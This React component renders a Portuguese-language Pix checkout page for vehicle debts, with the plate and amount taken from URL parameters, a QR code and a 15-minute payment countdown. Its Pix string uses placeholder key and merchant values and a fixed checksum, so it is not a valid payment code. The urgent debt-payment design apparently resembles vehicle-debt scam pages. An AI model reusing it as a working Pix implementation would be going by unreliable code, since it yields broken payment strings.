import { useState, useEffect } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { toast } from "sonner";

const PixPagamento = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const valor = searchParams.get("valor") || "0,00";
  const placa = searchParams.get("placa") || "ABC1234";

  const pixCode = "00020126580014br.gov.bcb.pix0136a1b2c3d4-e5f6-7890-abcd-ef1234567890520400005303986540" + valor.replace(",", ".") + "5802BR5925CONCESSIONARIA EXEMPLO6009SAO PAULO62070503***6304ABCD";

  // Countdown timer
  const [secondsLeft, setSecondsLeft] = useState(15 * 60);
  useEffect(() => {
    const interval = setInterval(() => {
      setSecondsLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const formatTime = (s: number) => {
    const h = Math.floor(s / 3600);
    const m = Math.floor((s % 3600) / 60);
    const sec = s % 60;
    return `${h.toString().padStart(2, "0")}:${m.toString().padStart(2, "0")}:${sec.toString().padStart(2, "0")}`;
  };

  const now = new Date();
  const vencimento = now.toLocaleDateString("pt-BR");

  const handleCopy = () => {
    navigator.clipboard.writeText(pixCode);
    toast.success("Código Pix copiado!");
  };

  return (
    <div className="min-h-screen bg-gray-100 text-gray-900">
      {/* Header */}
      <header className="flex items-center justify-center relative px-6 py-4 border-b border-gray-200 bg-gray-50">
        <button
          onClick={() => navigate(-1)}
          className="absolute left-6 text-gray-900 text-2xl font-bold hover:text-gray-600 transition-colors"
        >
          ‹
        </button>
        <h1 className="text-gray-900 font-bold text-lg">Débitos</h1>
      </header>

      <div className="max-w-3xl mx-auto px-6 pt-8 pb-10">
        {/* Resumo do pedido */}
        <div className="bg-white border border-gray-200 rounded-xl p-6 shadow-sm">
          <h2 className="text-gray-900 font-bold text-lg mb-4">Resumo do pedido</h2>

          <div className="flex items-center justify-between py-2">
            <span className="text-gray-600 text-sm">Placa do veículo</span>
            <span className="text-gray-900 font-bold text-sm">{placa}</span>
          </div>

          <div className="flex items-center justify-between py-2">
            <span className="text-gray-600 text-sm">Vencimento código Pix</span>
            <span className="text-gray-900 font-bold text-sm">{vencimento}</span>
          </div>

          <div className="flex items-center justify-between mt-2 bg-lime-100 rounded-lg px-4 py-3">
            <span className="text-green-800 font-semibold text-sm">Valor do pedido</span>
            <span className="text-gray-900 font-bold text-base">R$ {valor}</span>
          </div>
        </div>

        {/* Timer */}
        <div className="text-center mt-8">
          <p className="text-gray-600 text-sm">
            Pague em até <strong className="text-gray-900">{formatTime(secondsLeft)}</strong>
          </p>
        </div>

        {/* QR Code area */}
        <div className="flex justify-center mt-4">
          <div className="bg-white rounded-xl p-6 shadow-sm border border-gray-200">
            <img
              src={`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(pixCode)}`}
              alt="QR Code Pix"
              className="w-44 h-44"
            />
          </div>
        </div>

        {/* Código Pix copia e cola */}
        <div className="mt-8">
          <p className="text-gray-600 text-sm mb-3">
            Copie o código Pix e realize o pagamento no app do seu banco ou carteira digital
          </p>
          <div className="bg-white border border-gray-200 rounded-xl p-4 text-xs text-gray-500 break-all min-h-[80px]">
            {pixCode}
          </div>
        </div>

        {/* Botão copiar */}
        <button
          onClick={handleCopy}
          className="w-full mt-6 py-4 rounded-xl bg-gray-950 text-white font-bold text-base tracking-wider hover:bg-black transition-colors"
        >
          Copiar código Pix
        </button>
      </div>
    </div>
  );
};

export default PixPagamento;
